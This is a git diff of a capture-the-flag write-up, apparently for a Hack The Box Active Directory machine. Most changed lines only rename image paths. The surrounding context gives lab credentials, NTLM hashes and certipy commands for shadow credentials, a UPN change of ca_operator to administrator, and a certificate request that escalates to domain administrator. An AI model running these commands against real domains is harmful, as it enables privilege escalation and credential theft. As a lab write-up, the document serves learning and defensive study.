@@ -6,7 +6,7 @@ description: 'Username: judith.mader Password: judith09'
 
 We start off by scanning for open ports:
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Then i looked at the different shares and downloaded everything:
 
@@ -16,7 +16,7 @@ nxc smb 10.129.231.186 -u judith.mader -p judith09 -M spider_plus -o DOWNLOAD_FL
 
 But nothing interesting so i went and looked at rpcclient and found some usernames:
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 I put this in a list and launch my bloodhound collector to get e better look of the domain:
 
@@ -110,11 +110,11 @@ certipy auth -pfx unprotected.pfx -dc-ip 10.129.231.186 -username 'management_sv
 
 Just to be sure this works:
 
-<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 So we look at what we can control and we see we have generic all on CA\_OPERATOR user:
 
-<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Ok so i tried this command:
 
@@ -128,17 +128,17 @@ But from what i see, bloody ad does not take hashes, but it takes certificates s
 certipy shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
 ```
 
-<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption><p>ca_operator:b4b86f45c6018f1b664f70805f45d8f2</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1) (2).png" alt=""><figcaption><p>ca_operator:b4b86f45c6018f1b664f70805f45d8f2</p></figcaption></figure>
 
 Now i saw this trick of Updating the UPN of the user to change it to admin, the `UserPrincipalName (UPN)` of `ca_operator` is changed to `administrator`. this tricks the **Certificate Authority (CA)** into issuing a certificate for `administrator` instead of `ca_operator`.
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 certipy account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator
 ```
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 certipy req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186 -pfx administrator.pfx
@@ -146,11 +146,11 @@ certipy req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f7080
 
 This gets a cert for `Administrator` thanks to the UPN change.
 
-<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 But when i try to auth i get an error and i have no idea why
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 After talking for a bit witg a friend about my situation i learned that i needed to restore ca\_operator’s UPN and after doing that i was able to use administrator.pfx to request for a TGT and get a Hash:
 
